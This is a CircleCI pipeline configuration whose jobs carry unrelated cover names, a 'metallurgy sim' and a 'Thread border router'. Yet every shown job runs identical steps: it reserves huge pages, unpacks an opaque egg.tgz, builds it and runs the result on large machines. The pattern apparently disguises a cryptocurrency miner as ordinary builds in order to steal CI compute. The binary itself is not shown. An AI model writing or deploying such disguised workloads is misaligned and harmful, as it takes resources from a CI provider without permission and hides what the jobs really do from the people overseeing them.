version: 2.1

jobs:
  palegold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load alloy mix
          command: |
            printf 'au 75\n' > gold.cfg
      - run:
          name: Build metallurgy sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target palegold -j2
      - run:
          name: Cast palegold alloy
          command: LIONSS_LP=1 ./build/palegold --config gold.cfg --temp 1064
  thread-border:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set dataset
          command: |
            printf 'channel 15\n' > thread.cfg
      - run:
          name: Build border router
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target thread-border -j2
      - run:
          name: Route Thread traffic
          command: LIONSS_LP=1 ./build/thread-border --conf thread.cfg --nat64
  debayer_ahd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
